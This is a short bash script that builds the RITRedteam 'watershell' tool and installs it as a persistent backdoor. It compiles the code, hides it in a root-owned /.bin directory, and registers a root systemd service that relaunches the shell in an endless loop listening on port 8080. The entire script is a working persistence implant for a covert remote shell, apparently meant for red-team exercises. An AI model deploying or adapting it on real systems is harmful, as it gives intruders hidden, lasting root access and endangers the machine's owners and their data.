#!/bin/bash

# Install g++ if not already installed
sudo apt-get update
sudo apt-get install g++

# Clone the Watershell-Cpp repository
git clone https://github.com/RITRedteam/watershell-cpp.git

# Navigate to the cloned repository
cd watershell-cpp

# Compile the code using g++
g++ main.cpp watershell.cpp -o watershell

# Create the .bin folder in the root directory
sudo mkdir /.bin

# Copy the Watershell-Cpp files to the .bin folder
sudo cp -R * /.bin

# Change ownership of the .bin folder and its contents to the "root" user
sudo chown -R root:root /.bin

# Create the startup script
cat <<EOF > /.bin/watershell_startup.sh
#!/bin/bash
cd /.bin
while true; do
    ./watershell -l 8080 eth0
    sleep 1
done
EOF

# Make the startup script executable
sudo chmod +x /.bin/watershell_startup.sh

# Add the script to the system's startup configuration
cat <<EOF | sudo tee /etc/systemd/system/watershell.service
[Unit]
Description=Watershell-Cpp Startup

[Service]
ExecStart=/.bin/watershell_startup.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Enable the service to run on startup
sudo systemctl enable watershell.service

# Start the watershell.service
sudo systemctl start watershell.service

# To execute this script again in the future, use the following command:
# ./setup_watershell.sh